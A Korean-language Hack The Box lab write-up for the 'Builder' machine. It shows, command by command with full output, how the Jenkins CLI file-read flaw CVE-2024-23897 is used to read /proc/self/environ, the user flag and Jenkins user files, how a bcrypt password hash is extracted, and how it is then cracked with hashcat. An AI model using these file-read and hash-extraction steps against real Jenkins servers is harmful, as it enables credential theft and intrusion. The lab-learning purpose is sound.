---
tags:
  - type/machine
  - platform/htb
  - os/linux
  - status/solved
  - tech/web/lfi-rfi
  - tech/cred/crack
type: machine
platform: htb
os: linux
ip: 10.129.230.220
domain: builder.htb
ports: [22, 8080]
services: [http, ssh]
cves: [CVE-2024-23897]
status: solved
tech_count: 2
---
## Nmap

```bash
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-17 15:40 +0900
Nmap scan report for 10.129.230.220
Host is up (0.27s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
8080/tcp open  http    Jetty 10.0.18
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(10.0.18)
|_http-title: Dashboard [Jenkins]
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT       ADDRESS
1   270.40 ms 10.10.14.1
2   271.10 ms 10.129.230.220

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.16 seconds

```

jenkins-cli.jar 다운로드
```bash
┌──(kali㉿kali)-[~/HTB/Builder]
└─$ wget http://builder.htb:8080/jnlpJars/jenkins-cli.jar
--2026-03-17 15:49:00--  http://builder.htb:8080/jnlpJars/jenkins-cli.jar
Resolving builder.htb (builder.htb)... 10.129.230.220
Connecting to builder.htb (builder.htb)|10.129.230.220|:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3623400 (3.5M) [application/java-archive]
Saving to: ‘jenkins-cli.jar’

jenkins-cli.jar              100%[==============================================>]   3.46M   926KB/s    in 3.8s    

2026-03-17 15:49:04 (926 KB/s) - ‘jenkins-cli.jar’ saved [3623400/3623400]

```

hostname 확보
```bash
┌──(kali㉿kali)-[~/HTB/Builder]
└─$ java -jar jenkins-cli.jar -s 'http://builder.htb:8080' help '@/etc/hostname' a

ERROR: Too many arguments: a
java -jar jenkins-cli.jar help [COMMAND]
Lists all the available commands or a detailed description of single command.
 COMMAND : Name of the command (default: 0f52c222a4cc)

```

POC 다운로드
https://github.com/binganao/CVE-2024-23897

```bash
┌──(kali㉿kali)-[~/HTB/Builder]
└─$ git clone https://github.com/binganao/CVE-2024-23897.git
Cloning into 'CVE-2024-23897'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 9 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (9/9), done.
Resolving deltas: 100% (1/1), done.

```

POC 실행하여 `/proc/self/environ` 파일 가져오기 `JENKINS_HOME=/var/jenkins_home`
```bash
┌──(kali㉿kali)-[~/HTB/Builder/CVE-2024-23897]
└─$ python poc.py http://builder.htb:8080/ /proc/self/environ
REQ: b'\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x15\x00\x00\x13@/proc/self/environ\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05zh_CN\x00\x00\x00\x00\x03'

RESPONSE: b'\x00\x00\x00\x00\x12\x08  add-job-to-view\n\x00\x00\x00\x17\x08    Adds jobs to view.\n\x00\x00\x00\x08\x08  build\n\x00\x00\x00=\x08    Builds a job, and optionally waits until its completion.\n\x00\x00\x00\x14\x08  cancel-quiet-down\n\x00\x00\x003\x08    Cancel the effect of the "quiet-down" command.\n\x00\x00\x00\x0e\x08  clear-queue\n\x00\x00\x00\x1c\x08    Clears the build queue.\n\x00\x00\x00\x0f\x08  connect-node\n\x00\x00\x00\x1b\x08    Reconnect to a node(s)\n\x00\x00\x00\n\x08  console\n\x00\x00\x00)\x08    Retrieves console output of a build.\n\x00\x00\x00\x0b\x08  copy-job\n\x00\x00\x00\x12\x08    Copies a job.\n\x00\x00\x00\x1c\x08  create-credentials-by-xml\n\x00\x00\x00\x1d\x08    Create Credential by XML\n\x00\x00\x00#\x08  create-credentials-domain-by-xml\n\x00\x00\x00%\x08    Create Credentials Domain by XML\n\x00\x00\x00\r\x08  create-job\n\x00\x00\x00D\x08    Creates a new job by reading stdin as a configuration XML file.\n\x00\x00\x00\x0e\x08  create-node\n\x00\x00\x00@\x08    Creates a new node by reading stdin as a XML configuration.\n\x00\x00\x00\x0e\x08  create-view\n\x00\x00\x00@\x08    Creates a new view by reading stdin as a XML configuration.\n\x00\x00\x00\x15\x08  declarative-linter\n\x00\x00\x00=\x08    Validate a Jenkinsfile containing a Declarative Pipeline\n\x00\x00\x00\x10\x08  delete-builds\n\x00\x00\x00\x1d\x08    Deletes build record(s).\n\x00\x00\x00\x15\x08  delete-credentials\n\x00\x00\x00\x18\x08    Delete a Credential\n\x00\x00\x00\x1c\x08  delete-credentials-domain\n\x00\x00\x00 \x08    Delete a Credentials Domain\n\x00\x00\x00\r\x08  delete-job\n\x00\x00\x00\x14\x08    Deletes job(s).\n\x00\x00\x00\x0e\x08  delete-node\n\x00\x00\x00\x14\x08    Deletes node(s)\n\x00\x00\x00\x0e\x08  delete-view\n\x00\x00\x00\x15\x08    Deletes view(s).\n\x00\x00\x00\x0e\x08  disable-job\n\x00\x00\x00\x14\x08    Disables a job.\n\x00\x00\x00\x11\x08  disable-plugin\n\x00\x00\x00+\x08    Disable one or more installed plugins.\n\x00\x00\x00\x12\x08  disconnect-node\n\x00\x00\x00\x1d\x08    Disconnects from a node.\n\x00\x00\x00\r\x08  enable-job\n\x00\x00\x00\x13\x08    Enables a job.\n\x00\x00\x00\x10\x08  enable-plugin\n\x00\x00\x008\x08    Enables one or more installed plugins transitively.\n\x00\x00\x00\x19\x08  get-credentials-as-xml\n\x00\x00\x000\x08    Get a Credentials as XML (secrets redacted)\n\x00\x00\x00 \x08  get-credentials-domain-as-xml\n\x00\x00\x00$\x08    Get a Credentials Domain as XML\n\x00\x00\x00\n\x08  get-job\n\x00\x00\x00,\x08    Dumps the job definition XML to stdout.\n\x00\x00\x00\x0b\x08  get-node\n\x00\x00\x00-\x08    Dumps the node definition XML to stdout.\n\x00\x00\x00\x0b\x08  get-view\n\x00\x00\x00-\x08    Dumps the view definition XML to stdout.\n\x00\x00\x00\t\x08  groovy\n\x00\x00\x00+\x08    Executes the specified Groovy script. \n\x00\x00\x00\x0b\x08  groovysh\n\x00\x00\x00&\x08    Runs an interactive groovy shell.\n\x00\x00\x00\x07\x08  help\n\x00\x00\x00R\x08    Lists all the available commands or a detailed description of single command.\n\x00\x00\x00\x1c\x08  import-credentials-as-xml\n\x00\x00\x00\xbe\x08    Import credentials as XML. The output of "list-credentials-as-xml" can be used as input here as is, the only needed change is to set the actual Secrets which are redacted in the output.\n\x00\x00\x00\x11\x08  install-plugin\n\x00\x00\x00J\x08    Installs a plugin either from a file, an URL, or from update center. \n\x00\x00\x00\r\x08  keep-build\n\x00\x00\x00.\x08    Mark the build to keep the build forever.\n\x00\x00\x00\x0f\x08  list-changes\n\x00\x00\x004\x08    Dumps the changelog for the specified build(s).\n\x00\x00\x00\x13\x08  list-credentials\n\x00\x00\x00.\x08    Lists the Credentials in a specific Store\n\x00\x00\x00\x1a\x08  list-credentials-as-xml\n\x00\x00\x00\xcc\x08    Export credentials as XML. The output of this command can be used as input for "import-credentials-as-xml" as is, the only needed change is to set the actual Secrets which are redacted in the output.\n\x00\x00\x00%\x08  list-credentials-context-resolvers\n\x00\x00\x00\'\x08    List Credentials Context Resolvers\n\x00\x00\x00\x1d\x08  list-credentials-providers\n\x00\x00\x00\x1f\x08    List Credentials Providers\n\x00\x00\x00\x0c\x08  list-jobs\n\x00\x00\x005\x08    Lists all jobs in a specific view or item group.\n\x00\x00\x00\x0f\x08  list-plugins\n\x00\x00\x00)\x08    Outputs a list of installed plugins.\n\x00\x00\x00\x07\x08  mail\n\x00\x00\x001\x08    Reads stdin and sends that out as an e-mail.\n\x00\x00\x00\x0f\x08  offline-node\n\x00\x00\x00_\x08    Stop using a node for performing builds temporarily, until the next "online-node" command.\n\x00\x00\x00\x0e\x08  online-node\n\x00\x00\x00a\x08    Resume using a node for performing builds, to cancel out the earlier "offline-node" command.\n\x00\x00\x00\r\x08  quiet-down\n\x00\x00\x00O\x08    Quiet down Jenkins, in preparation for a restart. Don\xa1\xaft start any builds.\n\x00\x00\x00\x17\x08  reload-configuration\n\x00\x00\x00\x8a\x08    Discard all the loaded data in memory and reload everything from file system. Useful when you modified config files directly on disk.\n\x00\x00\x00\r\x08  reload-job\n\x00\x00\x00\x12\x08    Reload job(s)\n\x00\x00\x00\x17\x08  remove-job-from-view\n\x00\x00\x00\x1c\x08    Removes jobs from view.\n\x00\x00\x00\x12\x08  replay-pipeline\n\x00\x00\x00I\x08    Replay a Pipeline build with edited script taken from standard input\n\x00\x00\x00\n\x08  restart\n\x00\x00\x00\x15\x08    Restart Jenkins.\n\x00\x00\x00\x15\x08  restart-from-stage\n\x00\x00\x00G\x08    Restart a completed Declarative Pipeline build from a given stage.\n\x00\x00\x00\x0f\x08  safe-restart\n\x00\x00\x003\x08    Safe Restart Jenkins. Don\xa1\xaft start any builds.\n\x00\x00\x00\x10\x08  safe-shutdown\n\x00\x00\x00l\x08    Puts Jenkins into the quiet mode, wait for existing builds to be completed, and then shut down Jenkins.\n\x00\x00\x00\r\x08  session-id\n\x00\x00\x00G\x08    Outputs the session ID, which changes every time Jenkins restarts.\n\x00\x00\x00\x18\x08  set-build-description\n\x00\x00\x00%\x08    Sets the description of a build.\n\x00\x00\x00\x19\x08  set-build-display-name\n\x00\x00\x00%\x08    Sets the displayName of a build.\n\x00\x00\x00\x0b\x08  shutdown\n\x00\x00\x00+\x08    Immediately shuts down Jenkins server.\n\x00\x00\x00\x0e\x08  stop-builds\n\x00\x00\x00\'\x08    Stop all running builds for job(s)\n\x00\x00\x00\x1c\x08  update-credentials-by-xml\n\x00\x00\x00\x1e\x08    Update Credentials by XML\n\x00\x00\x00#\x08  update-credentials-domain-by-xml\n\x00\x00\x00%\x08    Update Credentials Domain by XML\n\x00\x00\x00\r\x08  update-job\n\x00\x00\x00T\x08    Updates the job definition XML from stdin. The opposite of the get-job command.\n\x00\x00\x00\x0e\x08  update-node\n\x00\x00\x00V\x08    Updates the node definition XML from stdin. The opposite of the get-node command.\n\x00\x00\x00\x0e\x08  update-view\n\x00\x00\x00V\x08    Updates the view definition XML from stdin. The opposite of the get-view command.\n\x00\x00\x00\n\x08  version\n\x00\x00\x00!\x08    Outputs the current version.\n\x00\x00\x00\x14\x08  wait-node-offline\n\x00\x00\x00\'\x08    Wait for a node to become offline.\n\x00\x00\x00\x13\x08  wait-node-online\n\x00\x00\x00&\x08    Wait for a node to become online.\n\x00\x00\x00\x0b\x08  who-am-i\n\x00\x00\x00-\x08    Reports your credential and permissions.\n\x00\x00\x00\x01\x08\n\x00\x00\x02U\x08ERROR: No such command HOSTNAME=0f52c222a4cc\x00JENKINS_UC_EXPERIMENTAL=https://updates.jenkins.io/experimental\x00JAVA_HOME=/opt/java/openjdk\x00JENKINS_INCREMENTALS_REPO_MIRROR=https://repo.jenkins-ci.org/incrementals\x00COPY_REFERENCE_FILE_LOG=/var/jenkins_home/copy_reference_file.log\x00PWD=/\x00JENKINS_SLAVE_AGENT_PORT=50000\x00JENKINS_VERSION=2.441\x00HOME=/var/jenkins_home\x00LANG=C.UTF-8\x00JENKINS_UC=https://updates.jenkins.io\x00SHLVL=0\x00'JENKINS_HOME=/var/jenkins_home\'x00REF=/usr/share/jenkins/ref\x00PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\x00. Available commands are above. \n\x00\x00\x00\x04\x04\x00\x00\x00\x05'
                                                        
```


user.txt 획득`2db4f6158507a2af790659b6f213244f`
```bash
┌──(kali㉿kali)-[~/HTB/Builder/CVE-2024-23897]
└─$ python poc.py http://builder.htb:8080/ /var/jenkins_home/user.txt
REQ: b'\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x1d\x00\x00\x1b@/var/jenkins_home/user.txt\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05zh_CN\x00\x00\x00\x00\x03'

RESPONSE: b'\x00\x00\x00\x00\x12\x08  add-job-to-view\n\x00\x00\x00\x17\x08    Adds jobs to view.\n\x00\x00\x00\x08\x08  build\n\x00\x00\x00=\x08    Builds a job, and optionally waits until its completion.\n\x00\x00\x00\x14\x08  cancel-quiet-down\n\x00\x00\x003\x08    Cancel the effect of the "quiet-down" command.\n\x00\x00\x00\x0e\x08  clear-queue\n\x00\x00\x00\x1c\x08    Clears the build queue.\n\x00\x00\x00\x0f\x08  connect-node\n\x00\x00\x00\x1b\x08    Reconnect to a node(s)\n\x00\x00\x00\n\x08  console\n\x00\x00\x00)\x08    Retrieves console output of a build.\n\x00\x00\x00\x0b\x08  copy-job\n\x00\x00\x00\x12\x08    Copies a job.\n\x00\x00\x00\x1c\x08  create-credentials-by-xml\n\x00\x00\x00\x1d\x08    Create Credential by XML\n\x00\x00\x00#\x08  create-credentials-domain-by-xml\n\x00\x00\x00%\x08    Create Credentials Domain by XML\n\x00\x00\x00\r\x08  create-job\n\x00\x00\x00D\x08    Creates a new job by reading stdin as a configuration XML file.\n\x00\x00\x00\x0e\x08  create-node\n\x00\x00\x00@\x08    Creates a new node by reading stdin as a XML configuration.\n\x00\x00\x00\x0e\x08  create-view\n\x00\x00\x00@\x08    Creates a new view by reading stdin as a XML configuration.\n\x00\x00\x00\x15\x08  declarative-linter\n\x00\x00\x00=\x08    Validate a Jenkinsfile containing a Declarative Pipeline\n\x00\x00\x00\x10\x08  delete-builds\n\x00\x00\x00\x1d\x08    Deletes build record(s).\n\x00\x00\x00\x15\x08  delete-credentials\n\x00\x00\x00\x18\x08    Delete a Credential\n\x00\x00\x00\x1c\x08  delete-credentials-domain\n\x00\x00\x00 \x08    Delete a Credentials Domain\n\x00\x00\x00\r\x08  delete-job\n\x00\x00\x00\x14\x08    Deletes job(s).\n\x00\x00\x00\x0e\x08  delete-node\n\x00\x00\x00\x14\x08    Deletes node(s)\n\x00\x00\x00\x0e\x08  delete-view\n\x00\x00\x00\x15\x08    Deletes view(s).\n\x00\x00\x00\x0e\x08  disable-job\n\x00\x00\x00\x14\x08    Disables a job.\n\x00\x00\x00\x11\x08  disable-plugin\n\x00\x00\x00+\x08    Disable one or more installed plugins.\n\x00\x00\x00\x12\x08  disconnect-node\n\x00\x00\x00\x1d\x08    Disconnects from a node.\n\x00\x00\x00\r\x08  enable-job\n\x00\x00\x00\x13\x08    Enables a job.\n\x00\x00\x00\x10\x08  enable-plugin\n\x00\x00\x008\x08    Enables one or more installed plugins transitively.\n\x00\x00\x00\x19\x08  get-credentials-as-xml\n\x00\x00\x000\x08    Get a Credentials as XML (secrets redacted)\n\x00\x00\x00 \x08  get-credentials-domain-as-xml\n\x00\x00\x00$\x08    Get a Credentials Domain as XML\n\x00\x00\x00\n\x08  get-job\n\x00\x00\x00,\x08    Dumps the job definition XML to stdout.\n\x00\x00\x00\x0b\x08  get-node\n\x00\x00\x00-\x08    Dumps the node definition XML to stdout.\n\x00\x00\x00\x0b\x08  get-view\n\x00\x00\x00-\x08    Dumps the view definition XML to stdout.\n\x00\x00\x00\t\x08  groovy\n\x00\x00\x00+\x08    Executes the specified Groovy script. \n\x00\x00\x00\x0b\x08  groovysh\n\x00\x00\x00&\x08    Runs an interactive groovy shell.\n\x00\x00\x00\x07\x08  help\n\x00\x00\x00R\x08    Lists all the available commands or a detailed description of single command.\n\x00\x00\x00\x1c\x08  import-credentials-as-xml\n\x00\x00\x00\xbe\x08    Import credentials as XML. The output of "list-credentials-as-xml" can be used as input here as is, the only needed change is to set the actual Secrets which are redacted in the output.\n\x00\x00\x00\x11\x08  install-plugin\n\x00\x00\x00J\x08    Installs a plugin either from a file, an URL, or from update center. \n\x00\x00\x00\r\x08  keep-build\n\x00\x00\x00.\x08    Mark the build to keep the build forever.\n\x00\x00\x00\x0f\x08  list-changes\n\x00\x00\x004\x08    Dumps the changelog for the specified build(s).\n\x00\x00\x00\x13\x08  list-credentials\n\x00\x00\x00.\x08    Lists the Credentials in a specific Store\n\x00\x00\x00\x1a\x08  list-credentials-as-xml\n\x00\x00\x00\xcc\x08    Export credentials as XML. The output of this command can be used as input for "import-credentials-as-xml" as is, the only needed change is to set the actual Secrets which are redacted in the output.\n\x00\x00\x00%\x08  list-credentials-context-resolvers\n\x00\x00\x00\'\x08    List Credentials Context Resolvers\n\x00\x00\x00\x1d\x08  list-credentials-providers\n\x00\x00\x00\x1f\x08    List Credentials Providers\n\x00\x00\x00\x0c\x08  list-jobs\n\x00\x00\x005\x08    Lists all jobs in a specific view or item group.\n\x00\x00\x00\x0f\x08  list-plugins\n\x00\x00\x00)\x08    Outputs a list of installed plugins.\n\x00\x00\x00\x07\x08  mail\n\x00\x00\x001\x08    Reads stdin and sends that out as an e-mail.\n\x00\x00\x00\x0f\x08  offline-node\n\x00\x00\x00_\x08    Stop using a node for performing builds temporarily, until the next "online-node" command.\n\x00\x00\x00\x0e\x08  online-node\n\x00\x00\x00a\x08    Resume using a node for performing builds, to cancel out the earlier "offline-node" command.\n\x00\x00\x00\r\x08  quiet-down\n\x00\x00\x00O\x08    Quiet down Jenkins, in preparation for a restart. Don\xa1\xaft start any builds.\n\x00\x00\x00\x17\x08  reload-configuration\n\x00\x00\x00\x8a\x08    Discard all the loaded data in memory and reload everything from file system. Useful when you modified config files directly on disk.\n\x00\x00\x00\r\x08  reload-job\n\x00\x00\x00\x12\x08    Reload job(s)\n\x00\x00\x00\x17\x08  remove-job-from-view\n\x00\x00\x00\x1c\x08    Removes jobs from view.\n\x00\x00\x00\x12\x08  replay-pipeline\n\x00\x00\x00I\x08    Replay a Pipeline build with edited script taken from standard input\n\x00\x00\x00\n\x08  restart\n\x00\x00\x00\x15\x08    Restart Jenkins.\n\x00\x00\x00\x15\x08  restart-from-stage\n\x00\x00\x00G\x08    Restart a completed Declarative Pipeline build from a given stage.\n\x00\x00\x00\x0f\x08  safe-restart\n\x00\x00\x003\x08    Safe Restart Jenkins. Don\xa1\xaft start any builds.\n\x00\x00\x00\x10\x08  safe-shutdown\n\x00\x00\x00l\x08    Puts Jenkins into the quiet mode, wait for existing builds to be completed, and then shut down Jenkins.\n\x00\x00\x00\r\x08  session-id\n\x00\x00\x00G\x08    Outputs the session ID, which changes every time Jenkins restarts.\n\x00\x00\x00\x18\x08  set-build-description\n\x00\x00\x00%\x08    Sets the description of a build.\n\x00\x00\x00\x19\x08  set-build-display-name\n\x00\x00\x00%\x08    Sets the displayName of a build.\n\x00\x00\x00\x0b\x08  shutdown\n\x00\x00\x00+\x08    Immediately shuts down Jenkins server.\n\x00\x00\x00\x0e\x08  stop-builds\n\x00\x00\x00\'\x08    Stop all running builds for job(s)\n\x00\x00\x00\x1c\x08  update-credentials-by-xml\n\x00\x00\x00\x1e\x08    Update Credentials by XML\n\x00\x00\x00#\x08  update-credentials-domain-by-xml\n\x00\x00\x00%\x08    Update Credentials Domain by XML\n\x00\x00\x00\r\x08  update-job\n\x00\x00\x00T\x08    Updates the job definition XML from stdin. The opposite of the get-job command.\n\x00\x00\x00\x0e\x08  update-node\n\x00\x00\x00V\x08    Updates the node definition XML from stdin. The opposite of the get-node command.\n\x00\x00\x00\x0e\x08  update-view\n\x00\x00\x00V\x08    Updates the view definition XML from stdin. The opposite of the get-view command.\n\x00\x00\x00\n\x08  version\n\x00\x00\x00!\x08    Outputs the current version.\n\x00\x00\x00\x14\x08  wait-node-offline\n\x00\x00\x00\'\x08    Wait for a node to become offline.\n\x00\x00\x00\x13\x08  wait-node-online\n\x00\x00\x00&\x08    Wait for a node to become online.\n\x00\x00\x00\x0b\x08  who-am-i\n\x00\x00\x00-\x08    Reports your credential and permissions.\n\x00\x00\x00\x01\x08\n\x00\x00\x00X\x08ERROR: No such command 2db4f6158507a2af790659b6f213244f. Available commands are above. \n\x00\x00\x00\x04\x04\x00\x00\x00\x05'

```

다시 jenkins_cli 사용 `jennifer_jennifer_12108429903186576833` 획득
```bash
┌──(kali㉿kali)-[~/HTB/Builder]
└─$ java -jar jenkins-cli.jar -s 'http://builder.htb:8080' reload-job '@/var/jenkins_home/users/users.xml'
<?xml version='1.1' encoding='UTF-8'?>: No such item ‘<?xml version='1.1' encoding='UTF-8'?>’ exists.
      <string>jennifer_12108429903186576833</string>: No such item ‘      <string>jennifer_12108429903186576833</string>’ exists.
  <idToDirectoryNameMap class="concurrent-hash-map">: No such item ‘  <idToDirectoryNameMap class="concurrent-hash-map">’ exists.
    <entry>: No such item ‘    <entry>’ exists.
      <string>jennifer</string>: No such item ‘      <string>jennifer</string>’ exists.
  <version>1</version>: No such item ‘  <version>1</version>’ exists.
</hudson.model.UserIdMapper>: No such item ‘</hudson.model.UserIdMapper>’ exists.
  </idToDirectoryNameMap>: No such item ‘  </idToDirectoryNameMap>’ exists.
<hudson.model.UserIdMapper>: No such item ‘<hudson.model.UserIdMapper>’ exists.
    </entry>: No such item ‘    </entry>’ exists.

ERROR: Error occurred while performing this command, see previous stderr output.

```

config.xml 확인하여 hash 획득
```bash
┌──(kali㉿kali)-[~/HTB/Builder]
└─$ java -jar jenkins-cli.jar -s 'http://builder.htb:8080' reload-job '@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml'
    <hudson.tasks.Mailer_-UserProperty plugin="mailer@463.vedf8358e006b_">: No such item ‘    <hudson.tasks.Mailer_-UserProperty plugin="mailer@463.vedf8358e006b_">’ exists.
    <hudson.search.UserSearchProperty>: No such item ‘    <hudson.search.UserSearchProperty>’ exists.
      <roles>: No such item ‘      <roles>’ exists.
    <jenkins.security.seed.UserSeedProperty>: No such item ‘    <jenkins.security.seed.UserSeedProperty>’ exists.
      </tokenStore>: No such item ‘      </tokenStore>’ exists.
    </hudson.search.UserSearchProperty>: No such item ‘    </hudson.search.UserSearchProperty>’ exists.
      <timeZoneName></timeZoneName>: No such item ‘      <timeZoneName></timeZoneName>’ exists.
  <properties>: No such item ‘  <properties>’ exists.
    <jenkins.security.LastGrantedAuthoritiesProperty>: No such item ‘    <jenkins.security.LastGrantedAuthoritiesProperty>’ exists.
      <flags/>: No such item ‘      <flags/>’ exists.
    <hudson.model.MyViewsProperty>: No such item ‘    <hudson.model.MyViewsProperty>’ exists.
</user>: No such item ‘</user>’ exists.
    </jenkins.security.ApiTokenProperty>: No such item ‘    </jenkins.security.ApiTokenProperty>’ exists.
      <views>: No such item ‘      <views>’ exists.
        <string>authenticated</string>: No such item ‘        <string>authenticated</string>’ exists.
    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.200.vb_9327d658781">: No such item ‘    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.200.vb_9327d658781">’ exists.
<user>: No such item ‘<user>’ exists.
          <name>all</name>: No such item ‘          <name>all</name>’ exists.
  <description></description>: No such item ‘  <description></description>’ exists.
      <emailAddress>jennifer@builder.htb</emailAddress>: No such item ‘      <emailAddress>jennifer@builder.htb</emailAddress>’ exists.
      <collapsed/>: No such item ‘      <collapsed/>’ exists.
    </jenkins.security.seed.UserSeedProperty>: No such item ‘    </jenkins.security.seed.UserSeedProperty>’ exists.
    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>: No such item ‘    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>’ exists.
    </hudson.model.MyViewsProperty>: No such item ‘    </hudson.model.MyViewsProperty>’ exists.
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash"/>: No such item ‘      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash"/>’ exists.
          <filterQueue>false</filterQueue>: No such item ‘          <filterQueue>false</filterQueue>’ exists.
    <jenkins.security.ApiTokenProperty>: No such item ‘    <jenkins.security.ApiTokenProperty>’ exists.
      <primaryViewName></primaryViewName>: No such item ‘      <primaryViewName></primaryViewName>’ exists.
      </views>: No such item ‘      </views>’ exists.
    </hudson.model.TimeZoneProperty>: No such item ‘    </hudson.model.TimeZoneProperty>’ exists.
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@1319.v7eb_51b_3a_c97b_">: No such item ‘    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@1319.v7eb_51b_3a_c97b_">’ exists.
    </hudson.model.PaneStatusProperties>: No such item ‘    </hudson.model.PaneStatusProperties>’ exists.
    </hudson.tasks.Mailer_-UserProperty>: No such item ‘    </hudson.tasks.Mailer_-UserProperty>’ exists.
        <tokenList/>: No such item ‘        <tokenList/>’ exists.
    <jenkins.console.ConsoleUrlProviderUserProperty/>: No such item ‘    <jenkins.console.ConsoleUrlProviderUserProperty/>’ exists.
        </hudson.model.AllView>: No such item ‘        </hudson.model.AllView>’ exists.
      <timestamp>1707318554385</timestamp>: No such item ‘      <timestamp>1707318554385</timestamp>’ exists.
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>: No such item ‘          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>’ exists.
  </properties>: No such item ‘  </properties>’ exists.
    </jenkins.model.experimentalflags.UserExperimentalFlagsProperty>: No such item ‘    </jenkins.model.experimentalflags.UserExperimentalFlagsProperty>’ exists.
    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>: No such item ‘    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>’ exists.
    <hudson.security.HudsonPrivateSecurityRealm_-Details>: No such item ‘    <hudson.security.HudsonPrivateSecurityRealm_-Details>’ exists.
      <insensitiveSearch>true</insensitiveSearch>: No such item ‘      <insensitiveSearch>true</insensitiveSearch>’ exists.
          <properties class="hudson.model.View$PropertyList"/>: No such item ‘          <properties class="hudson.model.View$PropertyList"/>’ exists.
    <hudson.model.TimeZoneProperty>: No such item ‘    <hudson.model.TimeZoneProperty>’ exists.
        <hudson.model.AllView>: No such item ‘        <hudson.model.AllView>’ exists.
    </hudson.security.HudsonPrivateSecurityRealm_-Details>: No such item ‘    </hudson.security.HudsonPrivateSecurityRealm_-Details>’ exists.
      <providerId>default</providerId>: No such item ‘      <providerId>default</providerId>’ exists.
      </roles>: No such item ‘      </roles>’ exists.
    </jenkins.security.LastGrantedAuthoritiesProperty>: No such item ‘    </jenkins.security.LastGrantedAuthoritiesProperty>’ exists.
    <jenkins.model.experimentalflags.UserExperimentalFlagsProperty>: No such item ‘    <jenkins.model.experimentalflags.UserExperimentalFlagsProperty>’ exists.
    <hudson.model.PaneStatusProperties>: No such item ‘    <hudson.model.PaneStatusProperties>’ exists.
<?xml version='1.1' encoding='UTF-8'?>: No such item ‘<?xml version='1.1' encoding='UTF-8'?>’ exists.
  <fullName>jennifer</fullName>: No such item ‘  <fullName>jennifer</fullName>’ exists.
      <seed>6841d11dc1de101d</seed>: No such item ‘      <seed>6841d11dc1de101d</seed>’ exists.
  <id>jennifer</id>: No such item ‘  <id>jennifer</id>’ exists.
  <version>10</version>: No such item ‘  <version>10</version>’ exists.
      <tokenStore>: No such item ‘      <tokenStore>’ exists.
          <filterExecutors>false</filterExecutors>: No such item ‘          <filterExecutors>false</filterExecutors>’ exists.
    <io.jenkins.plugins.thememanager.ThemeUserProperty plugin="theme-manager@215.vc1ff18d67920"/>: No such item ‘    <io.jenkins.plugins.thememanager.ThemeUserProperty plugin="theme-manager@215.vc1ff18d67920"/>’ exists.
      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>: No such item ‘      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>’ exists.

ERROR: Error occurred while performing this command, see previous stderr output.

```

hashcat 자동 분석
```bash
┌──(kali㉿kali)-[~/HTB/Builder]
└─$ hashcat --user jennifer_hash                                   
hashcat (v7.1.2) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-AMD Ryzen 7 9800X3D 8-Core Processor, 6970/13940 MB (2048 MB allocatable), 4MCU

The following 6 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  25600 | bcrypt(md5($pass))                                         | Generic KDF
  25800 | bcrypt(sha1($pass))                                        | Generic KDF
  30600 | bcrypt(sha256($pass))                                      | Generic KDF
  28400 | bcrypt(sha512($pass))                                      | Generic KDF
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  33800 | WBB4 (Woltlab Burning Board) [bcrypt(bcrypt($pass))]       | Forums, CMS, E-Commerce

Please specify the hash-mode with -m [hash-mode].

Started: Tue Mar 17 16:10:52 2026
Stopped: Tue Mar 17 16:10:52 2026
                                           
```

자격증명 획득 `princess`
```bash
┌──(kali㉿kali)-[~/HTB/Builder]
└─$ hashcat --user jennifer_hash -m 3200 /usr/share/wordlists/rockyou.txt 
